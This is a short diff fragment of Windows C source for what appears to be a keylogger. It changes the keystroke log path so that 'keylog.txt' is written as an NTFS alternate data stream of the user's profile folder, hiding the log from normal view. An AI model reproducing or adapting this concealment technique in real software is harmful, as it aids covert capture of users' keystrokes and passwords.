@@ -51,7 +51,7 @@ DWORD WINAPI ThreadProc(LPVOID lpParamter)
     CHAR szPath[MAX_PATH] = { 0 };
     CHAR szTimeFormat[0x50] = { 0 };
     SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, szPath);
-    sprintf_s(szPath,"%s/%s",szPath,"keylog.txt");
+    wsprintfA(szPath,"%s:%s",szPath,"keylog.txt");
     //MessageBoxA(0,szPath,0,0);
     
     // 打开输出文件
